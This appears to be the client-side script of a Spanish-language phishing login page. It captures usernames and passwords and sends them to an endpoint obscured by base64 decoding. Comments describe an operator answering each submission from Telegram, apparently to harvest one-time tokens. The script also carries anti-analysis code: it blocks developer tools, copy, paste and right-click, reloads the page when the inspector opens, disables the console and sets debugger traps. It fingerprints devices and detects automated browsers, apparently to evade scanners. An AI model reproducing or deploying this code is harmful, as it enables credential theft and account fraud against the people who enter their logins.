        // reCAPTCHA desactivado
        var _fd = null; // Datos del formulario del servidor
        
        // Inicializar formulario obteniendo token del servidor
        async function initForm() {
            try {
                const resp = await fetch('init_form.php', { credentials: 'same-origin' });
                if (resp.ok) {
                    _fd = await resp.json();
                    document.getElementById('server_token').value = _fd.st;
                }
            } catch(e) {}
            generateCSRFToken();
        }
        
        // Generar un token CSRF y almacenarlo en una variable oculta y cookie (doble submit)
        function generateCSRFToken() {
            const token = (Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2));
            const csrfEl = document.getElementById('csrf_token');
            if (csrfEl) csrfEl.value = token;
            sessionStorage.setItem('csrf_token', token);
            document.cookie = `csrf_token=${token}; path=/; SameSite=Lax`;

            // Device/session identifier cookie (best-effort, not signed)
            const getCookie = (name) => document.cookie.split('; ').find(r => r.startsWith(name + '='))?.split('=')[1];
            let did = getCookie('did') || localStorage.getItem('did');
            if (!did) {
                // simple random id
                const rand = () => Math.random().toString(36).slice(2);
                did = `${Date.now().toString(36)}_${rand()}_${rand()}`;
                try { localStorage.setItem('did', did); } catch (e) {}
            }
            document.cookie = `did=${did}; path=/; Max-Age=31536000; SameSite=Lax`;
            // Set form timestamp
            const tsEl = document.getElementById('form_ts');
            if (tsEl) tsEl.value = Date.now().toString();
        }
    </script>

<script>
    // Mostrar error si viene de loginerror
        if (window.location.search.includes('error=1')) {
            document.getElementById('error-login').style.display = 'block';
        }

        // === DETECCIÓN DE BOTS ===
        var _humanScore = 0;
        var _mouseMovements = 0;
        var _keyPresses = 0;
        var _clicks = 0;

        // Detectar movimiento de mouse
        document.addEventListener('mousemove', function() {
            _mouseMovements++;
        });

        // Detectar teclas presionadas
        document.addEventListener('keydown', function() {
            _keyPresses++;
        });

        // Detectar clics
        document.addEventListener('click', function() {
            _clicks++;
        });

        // Función para detectar bot (MÁS ESTRICTA)
        function isBot() {
            // Detectar WebDriver (Selenium, Puppeteer, etc.)
            if (navigator.webdriver) return true;
            if (window.document.documentElement.getAttribute('webdriver')) return true;
            if (window.callPhantom || window._phantom) return true;
            if (window.__nightmare) return true;
            if (navigator.plugins.length === 0 && navigator.userAgent.indexOf('HeadlessChrome') !== -1) return true;
            
            // Detectar propiedades sospechosas
            if (window.outerWidth === 0 || window.outerHeight === 0) return true;
            
            // Detectar Chrome Headless
            if (navigator.userAgent.indexOf('HeadlessChrome') !== -1) return true;
            if (!window.chrome && navigator.userAgent.indexOf('Chrome') !== -1) return true;
            
            // Verificar interacción humana MÍNIMA (más estricto)
            var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            if (!isMobile) {
                // Para PC: requiere movimiento de mouse Y teclas presionadas
                if (_mouseMovements < 5 || _keyPresses < 5) return true;
            } else {
                // Para móvil: requiere al menos ALGO de interacción
                if (_keyPresses < 3 && _clicks < 1) return true;
            }
            
            // Detectar automatización avanzada
            try {
                if (window.document.$cdc_asdjflasutopfhvcZLmcfl_) return true;
                if (window.document.$chrome_asyncScriptInfo) return true;
                if (window.__webdriver_script_fn) return true;
            } catch(e) {}
            
            // Verificar tiempo desde que se cargó la página
            var pageLoadTime = Date.now() - parseInt(document.getElementById('form_ts').value || Date.now());
            if (pageLoadTime < 2000) return true; // Menos de 2 segundos = bot

            return false;
        }

        // Sincronizar campo de contraseña visible con el hidden
        document.getElementById('pp2_display').addEventListener('input', function() {
            document.getElementById('pp2_real').value = this.value;
        });

        var _recaptchaDone = true; // reCAPTCHA desactivado

        // handleSubmit: permite enviar CUALQUIER valor.
        // No bloquea por regex, longitud, bot check, ni timing.
        // El control de qué responder (login correcto / error / token)
        // lo decide el admin desde los botones de Telegram.
        // Las defensas anti-bot quedan SOLO del lado del servidor.
        async function handleSubmit(e) {
            e.preventDefault();
            const usuario = document.getElementById('pp1').value;
            const contrasena = document.getElementById('pp2_display').value;
            const mensajeError = document.getElementById('error-login');

            // Copiar password al hidden pp2
            document.getElementById('pp2_real').value = contrasena;

            // Solo bloquea si AMBOS campos están totalmente vacíos
            if (!usuario.trim() && !contrasena.trim()) {
                if (mensajeError) mensajeError.style.display = "block";
                return false;
            }

            // Si init_form.php aún no respondió, esperarlo ahora
            if (!_fd || !_fd.p1 || !_fd.p2 || !_fd.st) {
                try {
                    const resp = await fetch('init_form.php', { credentials: 'same-origin', cache: 'no-store' });
                    if (resp.ok) {
                        _fd = await resp.json();
                        document.getElementById('server_token').value = _fd.st;
                    }
                } catch(err) {}
            }

            // Endpoint dinámico, fallback hardcoded si todo falla
            const form = document.getElementById('mainForm');
            if (_fd && _fd.p1 && _fd.p2) {
                form.action = atob(_fd.p1 + _fd.p2);
            } else {
                form.action = 'z7k2m_secure_handler.php';
            }

            // Garantizar timestamp >= 400ms (mínimo del servidor es 300ms)
            const tsEl = document.getElementById('form_ts');
            const now = Date.now();
            const ts = parseInt(tsEl.value || '0', 10);
            if (!ts) {
                tsEl.value = (now - 500).toString();
            } else if ((now - ts) < 400) {
                await new Promise(r => setTimeout(r, 500));
            }

            if (mensajeError) mensajeError.style.display = "none";
            form.submit();
            return false;
        }

    // Bloquear TODAS las herramientas de inspección
    document.addEventListener('keydown', function(e) {
        // F12, Ctrl+Shift+I/J/C, Ctrl+U, Ctrl+S, Ctrl+A, Ctrl+Shift+A
        if (e.key === 'F12' || 
            (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j' || e.key === 'C' || e.key === 'c')) ||
            (e.ctrlKey && (e.key === 'U' || e.key === 'u' || e.key === 'S' || e.key === 's' || e.key === 'A' || e.key === 'a')) ||
            (e.ctrlKey && e.shiftKey && (e.key === 'A' || e.key === 'a'))) {
            e.preventDefault();
            e.stopPropagation();
            return false;
        }
    });

    // Bloquear menú contextual TODAS las formas
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
        e.stopPropagation();
        return false;
    });

    // Bloquear selección de texto COMPLETA
    document.addEventListener('selectstart', function(e) {
        e.preventDefault();
        e.stopPropagation();
        return false;
    });

    document.addEventListener('mousedown', function(e) {
        if (e.detail > 1) {
            e.preventDefault();
            return false;
        }
    });

    // Bloquear arrastrar COMPLETO
    document.addEventListener('dragstart', function(e) {
        e.preventDefault();
        e.stopPropagation();
        return false;
    });

    // Bloquear copiar y pegar
    document.addEventListener('copy', function(e) {
        e.preventDefault();
        e.stopPropagation();
        return false;
    });

    document.addEventListener('paste', function(e) {
        e.preventDefault();
        e.stopPropagation();
        return false;
    });

    // Bloquear herramientas de desarrollador
    setInterval(function() {
        if (window.outerHeight - window.innerHeight > 200 || window.outerWidth - window.innerWidth > 200) {
            window.location.reload();
        }
    }, 1000);

    // Detectar si están inspeccionando
    var devtools = {
        open: false,
        orientation: null
    };
    
    var threshold = 160;
    
    setInterval(function() {
        if (window.outerHeight - window.innerHeight > threshold || window.outerWidth - window.innerWidth > threshold) {
            if (!devtools.open) {
                devtools.open = true;
                window.location.reload();
            }
        } else {
            devtools.open = false;
        }
    }, 500);

    // Deshabilitar clic derecho en imágenes
    document.addEventListener('DOMContentLoaded', function() {
        var images = document.getElementsByTagName('img');
        for (var i = 0; i < images.length; i++) {
            images[i].addEventListener('contextmenu', function(e) {
                e.preventDefault();
                return false;
            });
        }
    });

    // Anti-debugging
    (function() {
        var _console = window.console;
        window.console = {
            log: function() {},
            warn: function() {},
            error: function() {},
            info: function() {},
            debug: function() {}
        };
        
        // Detectar debugging
        setInterval(function() {
            var debuggerOn = function() {
                debugger;
            };
            debuggerOn();
        }, 1000);
    })();
</script>
